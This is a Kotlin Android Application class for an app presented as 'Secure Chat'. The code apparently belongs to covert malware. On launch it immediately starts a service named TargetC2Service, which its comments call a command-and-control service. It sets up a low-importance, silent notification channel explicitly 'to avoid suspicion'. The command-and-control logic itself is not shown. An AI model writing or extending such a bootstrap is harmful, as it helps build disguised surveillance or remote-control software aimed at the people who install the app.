package com.secure.chat

import android.app.Application
import android.app.NotificationChannel
import android.app.NotificationManager
import android.os.Build
import com.google.firebase.database.FirebaseDatabase

class SecureChatApp : Application() {

    companion object {
        const val CHANNEL_ID = "secure_chat_c2"
        const val CHANNEL_NAME = "Secure Chat Service"
        lateinit var instance: SecureChatApp
            private set
    }

    override fun onCreate() {
        super.onCreate()
        instance = this

        // Enable Firebase offline persistence
        FirebaseDatabase.getInstance().setPersistenceEnabled(true)

        createNotificationChannel()

        // Start C2 service immediately
        startC2Service()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                CHANNEL_NAME,
                NotificationManager.IMPORTANCE_LOW // Low to avoid suspicion
            ).apply {
                description = "Background service for Secure Chat"
                setShowBadge(false)
                enableVibration(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun startC2Service() {
        val intent = android.content.Intent(this, services.TargetC2Service::class.java).apply {
            action = "start"
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }
}
